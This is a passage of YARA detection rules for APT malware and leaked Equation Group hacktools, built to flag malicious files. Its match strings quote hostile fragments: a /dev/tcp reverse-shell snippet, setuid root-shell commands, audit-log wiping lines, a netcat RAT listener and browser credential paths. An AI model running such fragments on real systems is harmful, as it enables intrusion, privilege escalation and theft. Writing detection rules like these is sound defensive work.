    description = \"String seen in samples used in 2013-3893 0day attacks\"\n        threat_names = \"APT17, Deputyy Dog\"\n        ref = \"https://www.fireeye.com/blog/threat-research/2013/09/operation-deputydog-zero-day-cve-2013-3893-attack-against-japanese-targets.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"FireEye Labs\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_DeputyDog\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = \"DGGYDSYRL\"\n\n    condition:\n        uint16(0) == 0x5a4d and $a\n}\n\nrule DonotTeam_YTYframework : APT DonotTeam Windows\n{\n    meta:\n        description = \"Modular malware framework with similarities to EHDevel\"\n        threat_names = \"EHDevel, Donot\"\n        ref = \"arbornetworks.com/blog/asert/don\u2026, labs.bitdefender.com/2017/09/ehdeve\u2026\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"James E.C, ProofPoint\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT_DonotTeam_YTYframework\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"/football/download2/\" ascii wide\n        $x2 = \"/football/download/\" ascii wide\n        $x3 = \"Caption: Xp>\" wide\n        $x_c2 = \"5.135.199.0\" ascii fullword\n        $a1 = \"getGoogle\" ascii fullword\n        $a2 = \"/q /noretstart\" wide\n        $a3 = \"IsInSandbox\" ascii fullword\n        $a4 = \"syssystemnew\" ascii fullword\n        $a5 = \"ytyinfo\" ascii fullword\n        $a6 = \"\\\\ytyboth\\\\yty \" ascii\n        $s1 = \"SELECT Name FROM Win32_Processor\" wide\n        $s2 = \"SELECT Caption FROM Win32_OperatingSystem\" wide\n        $s3 = \"SELECT SerialNumber FROM Win32_DiskDrive\" wide\n        $s4 = \"VM: Yes\" wide fullword\n        $s5 = \"VM: No\" wide fullword\n        $s6 = \"helpdll.dll\" ascii fullword\n        $s7 = \"boothelp.exe\" ascii fullword\n        $s8 = \"SbieDll.dll\" wide fullword\n        $s9 = \"dbghelp.dll\" wide fullword\n        $s10 = \"YesNoMaybe\" ascii fullword\n        $s11 = \"saveData\" ascii fullword\n        $s12 = \"saveLogs\" ascii fullword\n\n    condition:\n        uint16be(0) == 0x4d5a and filesize < 500KB and (pe.imphash() == \"87775285899fa860b9963b11596a2ded\" or 1 of ($x*) or 3 of ($a*) or 6 of ($s*))\n}\n\nrule DragonFly_Unspecified_Malware_Sep1_A1\n{\n    meta:\n        description = \"Malware from DragonFly APT report\"\n        threat_names = \"DragonFly\"\n        ref = \"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Unspecified_Malware_Sep1_A1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and pe.imphash() == \"17a4bd9c95f2898add97f309fc6f9bcd\")\n}\n\nrule DragonFly_APT_Sep17_1\n{\n    meta:\n        description = \"Malware from DragonFly APT report\"\n        threat_names = \"DragonFly\"\n        ref = \"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"DragonFly_APT_Sep17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\Update\\\\Temp\\\\ufiles.txt\" fullword wide\n        $s2 = \"%02d.%02d.%04d %02d:%02d\" fullword wide\n        $s3 = \"*pass*.*\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and all of them)\n}\n\nrule DragonFly_APT_Sep17_2\n{\n    meta:\n        description = \"Malware from DragonFly APT report\"\n        threat_names = \"DragonFly\"\n        ref = \"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"DragonFly_APT_Sep17_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\AppData\\\\Roaming\\\\Opera Software\\\\Opera Stable\\\\Login Data\" fullword wide\n        $s2 = \"C:\\\\Users\\\\Public\\\\Log.txt\" fullword wide\n        $s3 = \"SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins\" fullword wide\n        $s4 = \"***************** Mozilla Firefox ****************\" fullword wide\n        $s5 = \"********************** Opera *********************\" fullword wide\n        $s6 = \"\\\\AppData\\\\Local\\\\Microsoft\\\\Credentials\\\\\" fullword wide\n        $s7 = \"\\\\Appdata\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\\" fullword wide\n        $s8 = \"**************** Internet Explorer ***************\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 3000KB and 3 of them)\n}\n\nrule DragonFly_APT_Sep17_3\n{\n    meta:\n        description = \"Malware from DragonFly APT report\"\n        threat_names = \"DragonFly\"\n        ref = \"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"DragonFly_APT_Sep17_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"kernel64.dll\" fullword ascii\n        $s2 = \"ws2_32.dQH\" fullword ascii\n        $s3 = \"HGFEDCBADCBA\" fullword ascii\n        $s4 = \"AWAVAUATWVSU\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 40KB and (pe.imphash() == \"6f03fb864ff388bac8680ac5303584be\" or all of them))\n}\n\nrule DragonFly_APT_Sep17_4\n{\n    meta:\n        description = \"Malware from DragonFly APT report\"\n        threat_names = \"DragonFly\"\n        ref = \"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"DragonFly_APT_Sep17_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"screen.exe\" fullword wide\n        $s2 = \"PlatformInvokeUSER32\" fullword ascii\n        $s3 = \"GetDesktopImageF\" fullword ascii\n        $s4 = \"PlatformInvokeGDI32\" fullword ascii\n        $s5 = \"GetDesktopImage\" fullword ascii\n        $s6 = \"Too many arguments, going to store in current dir\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 60KB and all of them)\n}\n\nrule Dubnium_Sample_1\n{\n    meta:\n        description = \"Sample mentioned in Dubnium Report\"\n        threat_names = \"Dubnium\"\n        ref = \"https://goo.gl/AW9Cuu\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Dubnium_Sample_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $key1 = \"3b840e20e9555e9fb031c4ba1f1747ce25cc1d0ff664be676b9b4a90641ff194\" fullword ascii\n        $key2 = \"90631f686a8c3dbc0703ffa353bc1fdf35774568ac62406f98a13ed8f47595fd\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule Dubnium_Sample_2\n{\n    meta:\n        description = \"Sample mentioned in Dubnium Report\"\n        threat_names = \"Dubnium\"\n        ref = \"https://goo.gl/AW9Cuu\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Dubnium_Sample_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \":*:::D:\\\\:c:~:\" fullword ascii\n        $s2 = \"SPMUVR\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and all of them)\n}\n\nrule Dubnium_Sample_3\n{\n    meta:\n        description = \"Sample mentioned in Dubnium Report\"\n        threat_names = \"Dubnium\"\n        ref = \"https://goo.gl/AW9Cuu\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Dubnium_Sample_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"copy /y \\\"%s\\\" \\\"%s\\\" \" fullword ascii\n        $x2 = \"del /f \\\"%s\\\" \" fullword ascii\n        $s1 = \"del /f /ah \\\"%s\\\" \" fullword ascii\n        $s2 = \"if exist \\\"%s\\\" goto Rept \" fullword ascii\n        $s3 = \"\\\\*.*.lnk\" fullword ascii\n        $s4 = \"Dropped\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and 5 of them\n}\n\nrule Dubnium_Sample_5\n{\n    meta:\n        description = \"Sample mentioned in Dubnium Report\"\n        threat_names = \"Dubnium\"\n        ref = \"https://goo.gl/AW9Cuu\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Dubnium_Sample_5\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"$innn[i$[i$^i[e[mdi[m$jf1Wehn[^Whl[^iin_hf$11mahZijnjbi[^[W[f1n$dej$[hn]1[W1ni1l[ic1j[mZjchl$$^he[[j[a[1_iWc[e[\" fullword ascii\n        $s2 = \"h$YWdh[$ij7^e$n[[_[h[i[[[\\\\][1$1[[j1W1[1cjm1[$[k1ZW_$$ncn[[Inbnnc[I9enanid[fZCX\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 9000KB and all of them\n}\n\nrule Dubnium_Sample_6\n{\n    meta:\n        description = \"Sample mentioned in Dubnium Report\"\n        threat_names = \"Dubnium\"\n        ref = \"https://goo.gl/AW9Cuu\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Dubnium_Sample_6\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&()`~-_=+[{]{;',.\" fullword ascii\n        $s2 = \"e_$0[bW\\\\RZY\\\\jb\\\\ZY[nimiRc[jRZ]\" fullword ascii\n        $s3 = \"f_RIdJ0W9RFb[$Fbc9[k_?Wn\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 4000KB and all of them\n}\n\nrule Dubnium_Sample_7\n{\n    meta:\n        description = \"Sample mentioned in Dubnium Report\"\n        threat_names = \"Dubnium\"\n        ref = \"https://goo.gl/AW9Cuu\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Dubnium_Sample_7\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"hWI[$lZ![nJ_[[lk[8Ihlo8ZiIl[[[$Ynk[f_8[88WWWJW[YWnl$$Z[ilf!$IZ$!W>Wl![W!k!$l!WoW8$nj8![8n_I^$[>_n[ZY[[Xhn_c!nnfK[!Z\" fullword ascii\n        $s2 = \"[i_^])[$n!]Wj^,h[,!WZmk^o$dZ[h[e!&W!l[$nd[d&)^Z\\\\^[[iWh][[[jPYO[g$$e&n\\\\,Wfg$[<g$[[ninn:j!!)Wk[nj[[o!!Y\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 9000KB and all of them\n}\n\nrule Dubnium_Sample_SSHOpenSSL\n{\n    meta:\n        description = \"Sample mentioned in Dubnium Report\"\n        threat_names = \"Dubnium\"\n        ref = \"https://goo.gl/AW9Cuu\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Dubnium_Sample_SSHOpenSSL\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"sshkeypairgen.exe\" fullword wide\n        $s2 = \"OpenSSL: FATAL\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 9000KB and all of them\n}\n\nrule EquationGroup_emptycriss\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: emptycriss)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_emptycriss\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"./emptycriss <target IP>\" fullword ascii\n        $s2 = \"Cut and paste the following to the telnet prompt:\" fullword ascii\n        $s8 = \"environ define TTYPROMPT abcdef\" fullword ascii\n\n    condition:\n        (filesize < 50KB and 1 of them)\n}\n\nrule EquationGroup_scripme\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: scripme)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_scripme\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"running \\\\\\\"tcpdump -n -n\\\\\\\", on the environment variable \\\\$INTERFACE, scripted\" fullword ascii\n        $x2 = \"Cannot read $opetc/scripme.override -- are you root?\" ascii\n        $x3 = \"$ENV{EXPLOIT_SCRIPME}\" ascii\n        $x4 = \"$opetc/scripme.override\" ascii\n\n    condition:\n        (filesize < 30KB and 1 of them)\n}\n\nrule EquationGroup_cryptTool\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: cryptTool)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_cryptTool\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"The encryption key is \" fullword ascii\n        $s2 = \"___tempFile2.out\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 200KB and all of them)\n}\n\nrule EquationGroup_dumppoppy\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: dumppoppy)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_dumppoppy\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Unless the -c (clobber) option is used, if two RETR commands of the\" fullword ascii\n        $x2 = \"mywarn(\\\"End of $destfile determined by \\\\\\\"^Connection closed by foreign host\\\\\\\"\\\")\" fullword ascii\n        $l1 = \"End of $destfile determined by \\\"^Connection closed by foreign host\"\n\n    condition:\n        (filesize < 20KB and 1 of them)\n}\n\nrule EquationGroup_Auditcleaner\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: Auditcleaner)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Auditcleaner\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"> /var/log/audit/audit.log; rm -f .\" ascii\n        $x2 = \"Pastables to run on target:\" ascii\n        $x3 = \"cp /var/log/audit/audit.log .tmp\" ascii\n        $l1 = \"Here is the first good cron session from\" fullword ascii\n        $l2 = \"No need to clean LOGIN lines.\" fullword ascii\n\n    condition:\n        (filesize < 300KB and 1 of them)\n}\n\nrule EquationGroup_reverse_shell\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: reverse.shell.script)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_reverse_shell\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"sh >/dev/tcp/\" ascii\n        $s2 = \" <&1 2>&1\" fullword ascii\n\n    condition:\n        (filesize < 1KB and all of them)\n}\n\nrule EquationGroup_tnmunger\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: tnmunger)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_tnmunger\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"TEST: mungedport=%6d  pp=%d  unmunged=%6d\" fullword ascii\n        $s2 = \"mungedport=%6d  pp=%d  unmunged=%6d\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 10KB and 1 of them)\n}\n\nrule EquationGroup_ys_ratload\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: ys.ratload.sh)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_ys_ratload\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"echo \\\"example: ${0} -l 192.168.1.1 -p 22222 -x 9999\\\"\" fullword ascii\n        $x2 = \"-x [ port to start mini X server on DEFAULT = 12121 ]\\\"\" fullword ascii\n        $x3 = \"CALLBACK_PORT=32177\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 3KB and 1 of them)\n}\n\nrule EquationGroup_eh_1_1_0\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: eh.1.1.0.0)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_eh_1_1_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"usage: %s -e -v -i target IP [-c Cert File] [-k Key File]\" fullword ascii\n        $x2 = \"TYPE=licxfer&ftp=%s&source=/var/home/ftp/pub&version=NA&licfile=\" ascii\n        $x3 = \"[-l Log File] [-m save MAC time file(s)] [-p Server Port]\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 100KB and 1 of them)\n}\n\nrule EquationGroup_evolvingstrategy_1_0_1\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: evolvingstrategy.1.0.1.1)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_evolvingstrategy_1_0_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"chown root sh; chmod 4777 sh;\" fullword ascii\n        $s2 = \"cp /bin/sh .;chown root sh;\" fullword ascii\n        $l1 = \"echo clean up when elevated:\" fullword ascii\n        $x1 = \"EXE=$DIR/sbin/ey_vrupdate\" fullword ascii\n\n    condition:\n        (filesize < 4KB and 1 of them)\n}\n\nrule EquationGroup_toast_v3_2_0\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: toast_v3.2.0.1-linux)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_toast_v3_2_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x2 = \"Del --- Usage: %s -l file -w wtmp -r user\" fullword ascii\n        $s5 = \"Roasting ->%s<- at ->%d:%d<-\" fullword ascii\n        $s6 = \"rbnoil -Roasting ->\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 50KB and 1 of them)\n}\n\nrule EquationGroup_sshobo\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: sshobo)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_sshobo\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Requested forwarding of port %d but user is not root.\" fullword ascii\n        $x2 = \"internal error: we do not read, but chan_read_failed for istate\" fullword ascii\n        $x3 = \"~#  - list forwarded connections\" fullword ascii\n        $x4 = \"packet_inject_ignore: block\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 600KB and all of them)\n}\n\nrule EquationGroup_magicjack_v1_1_0_0_client_1_1_0_0\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: magicjack_v1.1.0.0_client-1.1.0.0.py)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_magicjack_v1_1_0_0_client_1_1_0_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"result = self.send_command(\\\"ls -al %s\\\" % self.options.DIR)\" fullword ascii\n        $x2 = \"cmd += \\\"D=-l%s \\\" % self.options.LISTEN_PORT\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x2123 and filesize < 80KB and 1 of them)\n}\n\nrule EquationGroup_packrat\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: packrat)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_packrat\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x2 = \"Use this on target to get your RAT:\" fullword ascii\n        $x3 = \"$ratremotename && \" fullword ascii\n        $x5 = \"$command = \\\"$nc$bindto -vv -l -p $port < ${ratremotename}\\\" ;\" fullword ascii\n\n    condition:\n        (filesize < 70KB and 1 of them)\n}\n\nrule EquationGroup_telex\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: telex)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_telex\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"usage: %s -l [ netcat listener ] [ -p optional target port instead of 23 ] <ip>\" fullword ascii\n        $x2 = \"target is not vulnerable. exiting\" fullword ascii\n        $s3 = \"Sending final buffer: evil_blocks and shellcode...\" fullword ascii\n        $s4 = \"Timeout waiting for daemon to die.  Exploit probably failed.\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 50KB and 1 of them)\n}\n\nrule EquationGroup_calserver\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: calserver)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_calserver\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"usage: %s <host> <port> e <contents of a local file to be executed on target>\" fullword ascii\n        $x2 = \"Writing your %s to target.\" fullword ascii\n        $x3 = \"(e)xploit, (r)ead, (m)ove and then write, (w)rite\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 30KB and 1 of them)\n}\n\nrule EquationGroup_porkclient\n{\n    meta:\n        description = \"Equation Group hacktool leaked by ShadowBrokers (file: porkclient)\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        